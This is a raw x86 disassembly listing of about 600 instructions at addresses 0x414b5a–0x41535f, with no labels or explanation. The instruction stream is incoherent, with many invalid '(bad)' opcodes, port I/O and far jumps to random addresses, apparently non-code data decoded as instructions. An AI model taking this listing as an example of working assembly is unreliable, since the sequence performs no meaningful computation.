  414b5a:	and    BYTE PTR [ecx+0x70],0xa
  414b5e:	xor    bh,ch
  414b60:	pop    edx
  414b61:	xor    BYTE PTR [esi-0x2c5de109],bh
  414b67:	jle    0x414b4d
  414b69:	(bad)  
  414b6a:	mov    edi,0xe01a5235
  414b6f:	sbb    al,BYTE PTR [ebx-0x32]
  414b72:	jbe    0x414bb8
  414b74:	loope  0x414b93
  414b76:	sbb    DWORD PTR [ebp-0x775d7ab5],ecx
  414b7c:	inc    ebp
  414b7d:	es mov edi,0xdaccb76a
  414b83:	mov    WORD PTR [ebx],ds
  414b85:	repz cmp eax,0x28b281cc
  414b8b:	mov    dh,0x5a
  414b8d:	ror    ebx,0x5
  414b90:	push   edx
  414b91:	adc    al,0xd3
  414b93:	cmc    
  414b94:	test   BYTE PTR ds:0xa7fbb8e5,0xee
  414b9b:	or     BYTE PTR ds:[ebp+0x5a5c14c6],bl
  414ba2:	out    dx,al
  414ba3:	push   0xed5580fd
  414ba8:	(bad)  
  414ba9:	scas   eax,DWORD PTR es:[edi]
  414baa:	pop    ebp
  414bab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bac:	mov    ebx,?
  414bae:	fild   WORD PTR [edi+0x6]
  414bb1:	fldenv [eax+0x46e14f39]
  414bb7:	xchg   esi,eax
  414bb8:	and    BYTE PTR [ebx],cl
  414bba:	imul   edi,DWORD PTR [edx+0x35],0x927122cf
  414bc1:	xor    eax,0x7cff27e2
  414bc6:	sbb    edi,ebp
  414bc8:	xor    DWORD PTR [edi-0x67],0xa85bb473
  414bcf:	stos   DWORD PTR es:[edi],eax
  414bd0:	push   ebp
  414bd1:	test   eax,0xcedffbae
  414bd6:	xlat   BYTE PTR ds:[ebx]
  414bd7:	repnz push esi
  414bd9:	lock pop ss
  414bdb:	lods   al,BYTE PTR ds:[esi]
  414bdc:	sbb    DWORD PTR [eax-0x80],ebp
  414bdf:	fnstenv ds:0x29c2bbcb
  414be5:	cmc    
  414be6:	jmp    0x414c0b
  414be8:	mov    cl,0xa1
  414bea:	outs   dx,DWORD PTR ds:[esi]
  414beb:	xchg   edi,eax
  414bec:	sbb    esp,esp
  414bee:	iret   
  414bef:	out    dx,al
  414bf0:	jae    0x414c5d
  414bf2:	out    dx,eax
  414bf3:	or     BYTE PTR [edi-0x3748f41d],bh
  414bf9:	pop    ss
  414bfa:	mov    fs,WORD PTR [edx+0x21]
  414bfd:	lods   eax,DWORD PTR ds:[esi]
  414bfe:	imul   esi,DWORD PTR [edx],0xade0b111
  414c04:	sbb    eax,0xec2ea329
  414c09:	adc    al,BYTE PTR [ecx+ebx*2]
  414c0c:	stc    
  414c0d:	cld    
  414c0e:	lahf   
  414c0f:	fsubrp st(7),st
  414c11:	pop    es
  414c12:	xchg   edi,eax
  414c13:	test   ch,al
  414c15:	sub    dl,BYTE PTR cs:[edx+eax*8]
  414c19:	adc    al,0x1f
  414c1b:	lock (bad) 
  414c1d:	ja     0x414c8c
  414c1f:	cmp    bh,0x53
  414c22:	xchg   edx,eax
  414c23:	rcl    DWORD PTR [edi-0x5e],1
  414c26:	inc    ebx
  414c27:	or     DWORD PTR [eax+0x19],eax
  414c2a:	pop    ss
  414c2b:	ins    DWORD PTR es:[edi],dx
  414c2c:	outs   dx,DWORD PTR ds:[esi]
  414c2d:	fimul  WORD PTR [edx-0x8]
  414c30:	les    ebp,FWORD PTR [edi+ebp*4]
  414c33:	scas   eax,DWORD PTR es:[edi]
  414c34:	and    DWORD PTR [eax],ebx
  414c36:	mov    ah,0xb
  414c38:	dec    ebp
  414c39:	or     esi,ebp
  414c3b:	inc    edx
  414c3c:	call   0x65d48002
  414c41:	jbe    0x414c13
  414c43:	dec    ecx
  414c44:	xchg   edi,eax
  414c45:	mov    eax,0x9f21c99f
  414c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c4b:	(bad)  
  414c4c:	clc    
  414c4d:	dec    ebp
  414c4e:	lds    ebp,FWORD PTR [esi+0x7b46791a]
  414c54:	mov    cl,0xae
  414c56:	rcl    esi,cl
  414c58:	adc    al,0x55
  414c5a:	in     eax,0xf8
  414c5c:	mov    ds:0x5e88e7ea,eax
  414c61:	xor    BYTE PTR [edi+edi*2-0x26],0x7d
  414c66:	mov    edi,0x40edf6be
  414c6b:	dec    ebx
  414c6d:	jg     0x414c1a
  414c6f:	push   esp
  414c70:	loope  0x414c5c
  414c72:	cmc    
  414c73:	inc    edx
  414c74:	fmul   QWORD PTR [edx]
  414c76:	fisubr WORD PTR [ebp-0x76]
  414c79:	mov    ds:0x82e52d69,al
  414c7e:	pop    esp
  414c7f:	adc    al,0xf1
  414c81:	iret   
  414c82:	sti    
  414c83:	inc    eax
  414c84:	js     0x414c60
  414c86:	mov    ebx,0x9d2e9c61
  414c8b:	inc    eax
  414c8c:	jge    0x414ce4
  414c8e:	dec    ebx
  414c8f:	push   0x7d5f8003
  414c94:	mov    ds:0xaa9e989b,eax
  414c99:	mov    ds:0x376a554f,al
  414c9e:	mov    cs,WORD PTR es:[esp+esi*8]
  414ca2:	xor    BYTE PTR [esi+0x26b10b53],ch
  414ca8:	loop   0x414caa
  414caa:	mov    cl,0xdf
  414cac:	retf   0xfd88
  414caf:	jmp    FWORD PTR [ecx]
  414cb1:	xor    dh,bh
  414cb3:	adc    esi,DWORD PTR [edi+eax*8-0x3e]
  414cb7:	inc    esp
  414cb8:	(bad)  [edx-0x2d0a0e3c]
  414cbe:	arpl   WORD PTR [edx],bx
  414cc0:	and    bl,cl
  414cc2:	adc    al,0x4c
  414cc4:	fistp  DWORD PTR [esp+edx*1]
  414cc7:	xor    eax,0xa71a4e1a
  414ccc:	outs   dx,DWORD PTR gs:[esi]
  414cce:	mov    ss,WORD PTR [ebp+0x5a]
  414cd1:	shr    DWORD PTR [esi-0x4043f79e],1
  414cd7:	cmc    
  414cd8:	push   eax
  414cd9:	jmp    0xb071:0xbce1ba6f
  414ce0:	sbb    al,0xc3
  414ce2:	mov    ch,0xd5
  414ce4:	push   edx
  414ce5:	push   esi
  414ce6:	push   edx
  414ce7:	stos   BYTE PTR es:[di],al
  414ce9:	mov    esi,0x81ef8e8a
  414cee:	(bad)  
  414cef:	ins    DWORD PTR es:[edi],dx
  414cf0:	pusha  
  414cf1:	xor    bl,BYTE PTR [ebp-0x49a396b6]
  414cf7:	sub    BYTE PTR [edi-0x6ec5a265],al
  414cfd:	xchg   esp,eax
  414cfe:	jb     0x414d06
  414d00:	into   
  414d01:	std    
  414d02:	mov    WORD PTR [esi],fs
  414d04:	pushf  
  414d05:	adc    bl,BYTE PTR [ebx+0x24]
  414d08:	adc    cl,cl
  414d0a:	inc    ebx
  414d0b:	hlt    
  414d0c:	ds cwde 
  414d0e:	xor    edi,DWORD PTR [edi+edi*2-0x5]
  414d12:	push   cs
  414d13:	dec    ebx
  414d14:	add    dh,BYTE PTR gs:[ecx+0x5a]
  414d18:	and    BYTE PTR [ebp-0x27],dl
  414d1b:	mov    cl,0xed
  414d1d:	jns    0x414cf6
  414d1f:	out    dx,al
  414d20:	push   ebx
  414d21:	mov    dl,0x1e
  414d23:	mov    ebx,0xe7068a48
  414d28:	xchg   edx,eax
  414d29:	out    0x7c,eax
  414d2b:	retf   0x257f
  414d2e:	data16 test al,0x43
  414d31:	push   0x4f0e9774
  414d36:	push   esi
  414d37:	inc    ecx
  414d38:	ja     0x414ce9
  414d3a:	xchg   BYTE PTR [ebx+0x66],ah
  414d3d:	aam    0x37
  414d3f:	(bad)  [edx]
  414d41:	sub    al,0xa2
  414d43:	or     eax,0x45eb737a
  414d48:	int    0xc3
  414d4a:	sbb    BYTE PTR cs:[ebp+0x69],ch
  414d4e:	sbb    al,0x58
  414d50:	adc    esi,DWORD PTR [ecx+0x3386643e]
  414d56:	push   0xdfc895c
  414d5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d5c:	sbb    DWORD PTR [ebp-0x67],edi
  414d5f:	inc    esi
  414d60:	pop    eax
  414d61:	test   eax,0x649d2ced
  414d66:	or     esi,DWORD PTR [ecx+0x7fa00869]
  414d6c:	mov    cs,edx
  414d6e:	dec    edx
  414d6f:	or     cl,bl
  414d71:	push   0xe69145be
  414d76:	leave  
  414d77:	and    BYTE PTR [edx],bh
  414d79:	pop    edi
  414d7a:	pop    ebp
  414d7b:	sub    edi,edi
  414d7d:	inc    ebp
  414d7e:	cmp    al,ah
  414d80:	sbb    DWORD PTR [edx-0x76],edi
  414d83:	in     eax,dx
  414d84:	retf   0xc488
  414d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d88:	ror    DWORD PTR [ecx],cl
  414d8a:	xor    BYTE PTR [edi],dh
  414d8c:	dec    esi
  414d8d:	lahf   
  414d8e:	inc    ecx
  414d8f:	ds jle 0x414e03
  414d92:	hlt    
  414d93:	xor    DWORD PTR [eax+0x194c6650],0x23a97b58
  414d9d:	fwait
  414d9e:	dec    esi
  414d9f:	push   ecx
  414da0:	ss inc ecx
  414da2:	jbe    0x414e1b
  414da4:	dec    ebp
  414da5:	enter  0x3327,0x8c
  414da9:	jmp    0x6e03:0xb07fa5a
  414db0:	mov    dh,0xd
  414db2:	and    DWORD PTR [ecx+0x73],eax
  414db5:	aaa    
  414db6:	xchg   BYTE PTR [ebx+0x4e40e105],dl
  414dbc:	(bad)  
  414dbd:	repz mov al,0x17
  414dc0:	test   DWORD PTR [ebp+0xa05af07],esi
  414dc6:	push   ecx
  414dc7:	icebp  
  414dc8:	jnp    0x414d60
  414dca:	lods   al,BYTE PTR ds:[esi]
  414dcb:	and    DWORD PTR [edi+ebx*1+0x7f],0x31895c2e
  414dd3:	out    0xb8,al
  414dd5:	cwde   
  414dd6:	into   
  414dd7:	push   edx
  414dd8:	push   bp
  414dda:	sbb    BYTE PTR [ebx-0x602a6415],ch
  414de0:	add    eax,0x8b4ee
  414de5:	int    0x19
  414de7:	call   0x754d0994
  414dec:	push   ds
  414ded:	fisttp DWORD PTR [eax]
  414def:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414df0:	dec    edx
  414df1:	jmp    0xaa38:0x423dadd5
  414df8:	fild   DWORD PTR [esi+0x2a03a408]
  414dfe:	jo     0x414e5e
  414e00:	loopne 0x414e46
  414e02:	mov    ah,0xa1
  414e04:	(bad)  
  414e06:	jbe    0x414e6a
  414e08:	adc    esi,DWORD PTR [ebx]
  414e0a:	sar    DWORD PTR [ebp-0x19],cl
  414e0d:	adc    BYTE PTR [ebp+0x57e1add1],ah
  414e13:	scas   al,BYTE PTR es:[edi]
  414e14:	mov    eax,ds:0x760f637
  414e19:	and    bh,BYTE PTR [edi]
  414e1b:	ins    DWORD PTR es:[edi],dx
  414e1c:	jg     0x414db0
  414e1e:	or     cl,BYTE PTR [esi]
  414e20:	xor    eax,0x26008977
  414e25:	or     ah,0x6e
  414e28:	push   0x1a
  414e2a:	in     eax,0xb3
  414e2c:	push   ebx
  414e2d:	mov    DWORD PTR [edi-0x57],edx
  414e30:	jno    0x414dd2
  414e32:	jecxz  0x414db6
  414e34:	scas   eax,DWORD PTR es:[edi]
  414e35:	sbb    eax,0xf0ea140
  414e3a:	out    0x34,al
  414e3c:	and    eax,0xadaac40f
  414e41:	sar    DWORD PTR [ebx+0x67],cl
  414e44:	sbb    DWORD PTR [ebx-0x67b05ada],edi
  414e4a:	or     DWORD PTR [esi],0x97da7f65
  414e50:	dec    ebp
  414e51:	push   0x9399c326
  414e56:	or     DWORD PTR [edx-0x61],edi
  414e59:	addr16 dec esp
  414e5b:	inc    edi
  414e5c:	dec    ecx
  414e5d:	cmp    DWORD PTR [eax+eiz*4],eax
  414e60:	cmp    BYTE PTR [edx-0x12],0xe4
  414e64:	xchg   ebp,eax
  414e65:	cmp    eax,0x3a87cd96
  414e6a:	xor    al,0xf0
  414e6c:	add    DWORD PTR [eax-0x750e600e],esp
  414e72:	mov    DWORD PTR [edx-0x70],0xd1c1be2b
  414e79:	mov    BYTE PTR [edx],0x37
  414e7c:	fnstcw WORD PTR [edx+0x52f0f28]
  414e82:	popa   
  414e83:	pop    es
  414e84:	pop    edi
  414e85:	mov    dh,0x64
  414e87:	jmp    0x82fe10ca
  414e8c:	fcom   QWORD PTR [eax+0x5313a637]
  414e92:	cmp    al,0x3
  414e94:	ins    BYTE PTR es:[edi],dx
  414e95:	adc    eax,0xd342f74d
  414e9a:	cs pop eax
  414e9c:	mov    eax,0x82db2b6b
  414ea1:	inc    ebx
  414ea2:	add    eax,0xf3972c8f
  414ea7:	out    0x8a,al
  414ea9:	jae    0x414eeb
  414eab:	mov    dh,0x3e
  414ead:	inc    ebx
  414eae:	dec    ecx
  414eaf:	loop   0x414e49
  414eb1:	lahf   
  414eb2:	mov    ah,ch
  414eb4:	jecxz  0x414e9c
  414eb6:	jge    0x414e41
  414eb8:	and    dl,BYTE PTR [eax+ebx*4+0x6f8c48f4]
  414ebf:	push   ebp
  414ec0:	ds dec ebp
  414ec2:	jo     0x414ea3
  414ec4:	(bad)  
  414ec5:	lahf   
  414ec6:	(bad)  
  414ec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ec9:	or     BYTE PTR [ebx+0x4e],cl
  414ecc:	call   0x13cea4a2
  414ed1:	jnp    0x414ec1
  414ed3:	imul   ebp,esi,0x2650c91e
  414ed9:	push   eax
  414eda:	push   0xffffff8c
  414edc:	test   ch,bl
  414ede:	or     al,0x24
  414ee0:	or     DWORD PTR [edx-0x14f1ac39],0xb714eee0
  414eea:	mov    edi,0xe4053a5d
  414eef:	pusha  
  414ef0:	push   esp
  414ef1:	and    eax,0xd7604b2
  414ef6:	je     0x414ea3
  414ef8:	jmp    0x414f76
  414efa:	in     al,dx
  414efb:	(bad)  
  414efc:	sub    ebx,DWORD PTR [edi]
  414efe:	xor    BYTE PTR [ecx-0x52bbb44a],bh
  414f04:	xchg   ebp,eax
  414f05:	jg     0x414f07
  414f07:	int3   
  414f08:	xchg   BYTE PTR gs:[eax],dl
  414f0b:	rol    DWORD PTR [esp+ecx*1],1
  414f0e:	pop    ecx
  414f0f:	popf   
  414f10:	pop    edx
  414f11:	and    ebp,0xffffffb3
  414f14:	mov    ebx,0xd7232d2f
  414f19:	mov    esp,0xf0622e06
  414f1e:	sub    DWORD PTR [esi+0x5ed1db4f],edi
  414f24:	imul   esp,DWORD PTR [eax-0x4d76fd65],0x3014c104
  414f2e:	leave  
  414f2f:	sbb    dh,BYTE PTR [ecx+0x6a7c5a31]
  414f35:	imul   ebp,DWORD PTR [ebx+ebx*4+0x3f2ddb95],0xfffffffb
  414f3d:	enter  0xccb0,0xfb
  414f41:	test   cl,cl
  414f43:	test   al,0x6e
  414f45:	leave  
  414f46:	sub    ebp,ebp
  414f48:	rcl    ecx,cl
  414f4a:	cmp    al,BYTE PTR [ebx]
  414f4c:	pop    ds
  414f4d:	out    0xc7,al
  414f4f:	ins    BYTE PTR es:[edi],dx
  414f50:	jge    0x414f1f
  414f52:	pop    ss
  414f53:	pop    esp
  414f54:	std    
  414f55:	add    eax,0x2c763770
  414f5a:	mov    ch,0x56
  414f5c:	mov    ch,BYTE PTR [esi+ebp*2-0x6904e533]
  414f63:	adc    DWORD PTR [ecx+ecx*4-0x9],0x8529ff6c
  414f6b:	cwde   
  414f6c:	add    DWORD PTR [edi+0x65],0x1d8f1866
  414f73:	ror    ah,1
  414f75:	mov    ds:0xb2080d25,al
  414f7a:	jge    0x414ff7
  414f7c:	pop    ebp
  414f7d:	push   edx
  414f7e:	sar    DWORD PTR [edx-0x184b73df],1
  414f84:	push   es
  414f85:	mov    ds:0xc3f001df,eax
  414f8a:	imul   ebx,DWORD PTR [ecx-0x6ef92e98],0x6b3aab03
  414f94:	daa    
  414f95:	scas   al,BYTE PTR es:[edi]
  414f96:	int    0x3
  414f98:	cli    
  414f99:	adc    BYTE PTR [ebx-0x5737abd7],bh
  414f9f:	mov    al,0x88
  414fa1:	(bad)  
  414fa2:	stc    
  414fa3:	jl     0x414f80
  414fa5:	out    dx,eax
  414fa6:	add    ah,BYTE PTR ds:0xef64db88
  414fac:	xchg   DWORD PTR [eax-0x43e99099],ecx
  414fb2:	sbb    eax,0xaec03ee5
  414fb7:	inc    ecx
  414fb8:	inc    eax
  414fb9:	clc    
  414fba:	idiv   dl
  414fbc:	add    ah,BYTE PTR [edi+0x43245c97]
  414fc2:	outs   dx,DWORD PTR ds:[esi]
  414fc3:	mov    cl,0x45
  414fc5:	lock or eax,0xf6d3b7d
  414fcb:	push   edi
  414fcc:	pop    es
  414fcd:	pop    edx
  414fce:	mov    edx,0x3788051f
  414fd3:	cmp    eax,0x4f4838a3
  414fd8:	cmp    BYTE PTR [eax],0x91
  414fdb:	push   es
  414fdc:	icebp  
  414fdd:	dec    edx
  414fde:	iret   
  414fdf:	test   al,0x83
  414fe1:	sbb    esi,DWORD PTR [esi+esi*4+0x7a]
  414fe5:	jmp    0xedb2:0x8e87b580
  414fec:	inc    eax
  414fed:	mov    ebx,0xa9cc5b16
  414ff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ff3:	push   edi
  414ff4:	adc    ch,BYTE PTR ds:0x26522ccb
  414ffa:	data16 loope 0x415000
  414ffd:	jbe    0x414f86
  414fff:	and    DWORD PTR [esi-0x41da1143],edx
  415005:	add    al,0x74
  415007:	xchg   ebp,eax
  415008:	fisttp WORD PTR [eax-0x66431a4b]
  41500e:	jbe    0x414fa7
  415010:	imul   ecx,DWORD PTR [eax+ecx*8-0x48f78471],0x31
  415018:	ins    BYTE PTR es:[edi],dx
  415019:	out    0xdb,eax
  41501b:	inc    cl
  41501d:	sub    al,0x48
  41501f:	and    ecx,ebp
  415021:	push   es
  415022:	ret    
  415023:	mov    esi,0xdae52cd4
  415028:	ss inc esp
  41502a:	xchg   esp,eax
  41502b:	(bad)  
  41502c:	xchg   ebx,eax
  41502d:	pop    es
  41502e:	scas   al,BYTE PTR es:[edi]
  41502f:	jp     0x415070
  415031:	sbb    BYTE PTR [esi],0x0
  415034:	fwait
  415035:	xor    bh,BYTE PTR [edi]
  415037:	push   cs
  415038:	adc    BYTE PTR [ebx-0x26],0xab
  41503c:	sub    cl,dh
  41503e:	shl    DWORD PTR [esi],1
  415040:	pop    ebp
  415041:	lods   eax,DWORD PTR ds:[esi]
  415042:	aam    0x4a
  415044:	fldcw  WORD PTR [esi+0x2a]
  415047:	repz call 0x85f66b85
  41504d:	js     0x414fd0
  41504f:	inc    edx
  415050:	push   ebx
  415051:	sti    
  415052:	fnsave [edi+0x1e]
  415055:	and    dl,BYTE PTR [eax+0x33]
  415058:	push   ebx
  415059:	or     DWORD PTR [edi+0x7b],edx
  41505c:	add    BYTE PTR [esi-0x2f2acec9],cl
  415062:	or     eax,0xd4adfe20
  415067:	sbb    cl,dh
  415069:	jo     0x415033
  41506b:	mov    ebp,0xa3e3b33f
  415070:	outs   dx,BYTE PTR ds:[esi]
  415071:	mov    DWORD PTR [eax],edx
  415073:	mov    ah,0x70
  415075:	mov    esp,0xaf9813b1
  41507a:	mov    ecx,0xa0444d94
  41507f:	cmp    bl,BYTE PTR [ebp-0x57ea620]
  415085:	loop   0x4150cc
  415087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415088:	jns    0x415101
  41508a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41508b:	or     al,BYTE PTR [esi+eax*8-0x3d68eb3b]
  415092:	or     eax,0x7d2c4fe6
  415097:	push   0xf63243ab
  41509c:	push   ds
  41509d:	mov    bh,0xfa
  41509f:	pop    eax
  4150a0:	out    dx,eax
  4150a1:	outs   dx,DWORD PTR ds:[esi]
  4150a2:	push   0x86026ad1
  4150a7:	pop    es
  4150a8:	xchg   esi,eax
  4150a9:	fcom   DWORD PTR [edi]
  4150ab:	aad    0xf0
  4150ad:	xor    al,0x7
  4150af:	jae    0x4150ca
  4150b1:	or     al,BYTE PTR [eiz*2-0x245c0ca2]
  4150b8:	xor    DWORD PTR [esi+0x7ca36278],ebp
  4150be:	scas   al,BYTE PTR es:[edi]
  4150bf:	jmp    0x5bea:0x82025dbf
  4150c6:	mov    esi,0x90112fe1
  4150cb:	mov    esp,0x2022ca39
  4150d0:	jmp    0xd43af5a6
  4150d5:	hlt    
  4150d6:	aad    0xd1
  4150d8:	sub    eax,0x2a5a935e
  4150dd:	or     al,0x4a
  4150df:	sbb    edi,ebp
  4150e1:	pop    ebx
  4150e2:	sbb    DWORD PTR [ebx],esi
  4150e4:	and    bl,al
  4150e6:	and    eax,0xb62d0970
  4150eb:	or     DWORD PTR ds:0x216e4000,ebx
  4150f1:	das    
  4150f2:	pop    ds
  4150f3:	mov    eax,ds:0xd46881ae
  4150f8:	mov    cl,0x42
  4150fa:	sub    eax,DWORD PTR [ebp-0x6a68d706]
  415100:	addr16 data16 jno 0x4150cc
  415104:	push   edi
  415105:	retf   0x3bb1
  415108:	ss leave 
  41510a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41510b:	daa    
  41510c:	pop    ecx
  41510d:	xchg   ebx,eax
  41510e:	not    BYTE PTR [ebp+0x53e5dd9c]
  415114:	sbb    eax,DWORD PTR [eax+0x76]
  415117:	push   0x855bdef5
  41511c:	push   edx
  41511d:	push   0x5c3288fc
  415122:	out    dx,eax
  415123:	or     edx,DWORD PTR [edi]
  415125:	jmp    0x1c26:0x7672b430
  41512c:	sahf   
  41512d:	mov    esi,0x526ecf54
  415132:	add    al,0x3e
  415134:	cmp    al,0xca
  415136:	adc    BYTE PTR [esi+0x2e],0xef
  41513a:	dec    cx
  41513c:	bound  edx,QWORD PTR [esi-0x11]
  41513f:	or     BYTE PTR [ebx-0xbe76e18],cl
  415145:	jno    0x4150dc
  415147:	sub    edi,DWORD PTR [eax+0x14]
  41514a:	into   
  41514b:	imul   ecx,DWORD PTR [esp+edx*1],0x2e92b8b9
  415152:	or     esp,eax
  415154:	sbb    eax,0xda643e61
  415159:	jnp    0x4150f1
  41515b:	ret    
  41515c:	or     DWORD PTR [ebp+0x688e8569],0x42ffda1b
  415166:	mov    bl,0xd9
  415168:	and    esp,DWORD PTR [eax+0x7c5d03da]
  41516e:	mov    al,0x9f
  415170:	adc    al,0x35
  415172:	out    0x6e,al
  415174:	inc    edi
  415175:	sbb    al,dl
  415177:	repz jo 0x415143
  41517a:	jne    0x415135
  41517c:	mov    dl,0x68
  41517e:	div    BYTE PTR [edi-0x6cd05586]
  415184:	lea    esp,[ecx]
  415186:	(bad)
  41518b:	ins    BYTE PTR es:[edi],dx
  41518c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41518d:	fsubrp st(6),st
  41518f:	xor    al,0x69
  415191:	fidiv  WORD PTR [edx-0x2c]
  415194:	push   edx
  415195:	addr16 das 
  415197:	fild   WORD PTR [ecx+0x1eaaf540]
  41519d:	sbb    eax,0xcddd759f
  4151a2:	es cwde 
  4151a4:	mov    cl,0xfa
  4151a6:	dec    esi
  4151a7:	loop   0x415152
  4151a9:	outs   dx,BYTE PTR ds:[esi]
  4151aa:	stc    
  4151ab:	jno    0x4151ae
  4151ad:	jge    0x415207
  4151af:	dec    eax
  4151b0:	push   edx
  4151b1:	add    DWORD PTR [edi-0x51],esp
  4151b4:	mul    edi
  4151b6:	inc    ebp
  4151b7:	add    eax,0xa598d560
  4151bc:	fld1   
  4151be:	mov    bl,0xec
  4151c0:	lods   eax,DWORD PTR ds:[esi]
  4151c1:	xor    DWORD PTR [eax+eax*2+0x9cae109],edi
  4151c8:	sar    DWORD PTR [edi+eax*4+0x77],1
  4151cc:	add    eax,0xc6f124e8
  4151d1:	mov    eax,ds:0xca94b76d
  4151d6:	sub    eax,ecx
  4151d8:	jge    0x41522f
  4151da:	adc    BYTE PTR [edi+0x46],bh
  4151dd:	sbb    BYTE PTR [ecx],0xef
  4151e0:	mov    edi,0x37b425e5
  4151e5:	aad    0xc0
  4151e7:	push   es
  4151e8:	inc    esp
  4151e9:	xor    al,0xc1
  4151eb:	jnp    0x41521b
  4151ed:	pop    edi
  4151ee:	lods   al,BYTE PTR ds:[esi]
  4151ef:	push   cs
  4151f0:	xchg   BYTE PTR [ebx-0x767a8162],dl
  4151f6:	mov    WORD PTR [esi],?
  4151f8:	push   edi
  4151f9:	cmc    
  4151fa:	mov    edx,0xb85c74be
  4151ff:	repnz fcom st(0)
  415202:	(bad)  
  415203:	fsub   QWORD PTR [eax-0x46]
  415206:	call   0x63dd:0x927d343f
  41520d:	mov    bh,0x1c
  41520f:	mov    edi,0xba6f4154
  415214:	inc    edx
  415215:	mov    ?,WORD PTR [esi+0x3e]
  415218:	pop    esp
  415219:	add    DWORD PTR [ecx+eiz*2+0x68],0xfffffffe
  41521e:	sub    eax,0x66695c57
  415223:	sub    BYTE PTR [edx],cl
  415225:	pop    ecx
  415226:	popf   
  415227:	or     ah,ah
  415229:	outs   dx,DWORD PTR ds:[esi]
  41522a:	mov    cl,0x2b
  41522c:	xor    BYTE PTR [ebx+eiz*1+0x55],cl
  415230:	jmp    0xa7499060
  415235:	test   al,0xb6
  415237:	sub    DWORD PTR [ebp-0xa],0x53a21767
  41523e:	sub    ecx,DWORD PTR ds:0xcd1a285d
  415244:	mov    BYTE PTR ds:0x4c1bfe7e,0xcd
  41524b:	and    BYTE PTR [edi-0x74],0x3a
  41524f:	repnz and DWORD PTR [ebp+0x1e],eax
  415253:	push   eax
  415254:	jb     0x41525a
  415256:	xor    esp,ebp
  415258:	out    0xd6,al
  41525a:	scas   al,BYTE PTR es:[edi]
  41525b:	lock xor BYTE PTR [ecx+edi*8-0x71],ah
  415260:	jge    0x415273
  415262:	mov    ch,0x82
  415264:	inc    edi
  415265:	ins    DWORD PTR es:[edi],dx
  415266:	xchg   edi,eax
  415267:	lds    edi,FWORD PTR [ecx+edi*1+0x799a8d5d]
  41526e:	jo     0xe3c0dc83
  415274:	sbb    ecx,0xffffff96
  415277:	cmp    al,0x29
  415279:	xor    ebp,DWORD PTR [edi+esi*2+0xfaba6f1]
  415280:	inc    eax
  415281:	dec    ebx
  415282:	bound  ebx,QWORD PTR [ebx+ecx*8+0x3ae74158]
  415289:	stc    
  41528a:	cmp    eax,0x20be5d31
  41528f:	sub    cl,al
  415291:	inc    eax
  415292:	add    BYTE PTR [ebp-0x6c1a104c],ah
  415298:	popf   
  415299:	adc    ebp,DWORD PTR [ebx+0x69]
  41529c:	inc    ecx
  41529d:	mov    bl,0x3c
  41529f:	pop    esp
  4152a0:	jecxz  0x415310
  4152a2:	loopne 0x4152db
  4152a4:	mov    dh,0x1a
  4152a6:	nop
  4152a7:	(bad)  
  4152a8:	lea    edi,[ebx]
  4152aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152ab:	enter  0xfef3,0xb8
  4152af:	sbb    bh,BYTE PTR [ebp-0x20]
  4152b2:	cli    
  4152b3:	and    BYTE PTR [ebx+ebp*8-0x4c],0x4b
  4152b8:	dec    edx
  4152b9:	xlat   BYTE PTR ds:[ebx]
  4152ba:	into   
  4152bb:	add    DWORD PTR [edi],esp
  4152bd:	xor    al,0xba
  4152bf:	daa    
  4152c0:	xor    dl,BYTE PTR [ebp-0x16]
  4152c3:	shl    DWORD PTR [eax],1
  4152c5:	inc    ecx
  4152c6:	dec    ecx
  4152c7:	ins    BYTE PTR es:[edi],dx
  4152c8:	and    BYTE PTR [esi],bh
  4152ca:	inc    edi
  4152cb:	aam    0x9c
  4152cd:	ret    0x4548
  4152d0:	push   ss
  4152d1:	and    eax,ebp
  4152d3:	mov    edi,0x6e08cebd
  4152d8:	test   al,0x64
  4152da:	addr16 je 0x4152dc
  4152dd:	mov    ebx,0xfb23cd3e
  4152e2:	popf   
  4152e3:	adc    dh,BYTE PTR [ecx-0x6d]
  4152e6:	jnp    0x4152a5
  4152e8:	sub    cl,cl
  4152ea:	in     eax,dx
  4152eb:	sub    BYTE PTR [esi],cl
  4152ed:	iret   
  4152ee:	mov    ebp,0x75e4b392
  4152f3:	loope  0x41528c
  4152f5:	dec    ebx
  4152f6:	fyl2xp1 
  4152f8:	fisubr WORD PTR [ecx+0x53]
  4152fb:	out    0x71,al
  4152fd:	mov    bl,0x7a
  4152ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415300:	add    BYTE PTR [ecx-0x336a2db2],al
  415306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415307:	push   ebx
  415308:	pushf  
  415309:	cwde   
  41530a:	popa   
  41530b:	pop    edi
  41530c:	dec    ebx
  41530d:	jns    0x415311
  41530f:	xor    esi,DWORD PTR gs:[esi+ebp*1-0x521a6ee0]
  415317:	call   0xa15c11dd
  41531c:	push   edi
  41531d:	sahf   
  41531e:	or     BYTE PTR [ebx],dl
  415320:	and    DWORD PTR [eax+edi*1],esp
  415323:	jae    0x4152c1
  415325:	or     dl,ah
  415327:	addr16 and ax,0xf80
  41532c:	ja     0x415389
  41532e:	popa   
  41532f:	adc    BYTE PTR [ebp+0x28],dh
  415332:	mov    dh,0x18
  415334:	pop    ecx
  415335:	jecxz  0x4152d7
  415337:	retf   0x7899
  41533a:	sbb    ebx,DWORD PTR [edi+esi*2-0x28a7ceab]
  415341:	and    eax,0x276b7743
  415346:	pop    ebp
  415347:	in     eax,0x99
  415349:	add    ax,0x46f0
  41534d:	jne    0x415309
  41534f:	add    BYTE PTR [edx-0x7b],dl
  415352:	mov    DWORD PTR [edi],ebp
  415354:	fdiv   st,st(3)
  415356:	loope  0x4153b8
  415358:	mov    ebx,0xc30bf9af
  41535d:	ins    DWORD PTR es:[edi],dx
  41535e:	cld    
  41535f:	adc    eax,DWORD PTR [ecx]
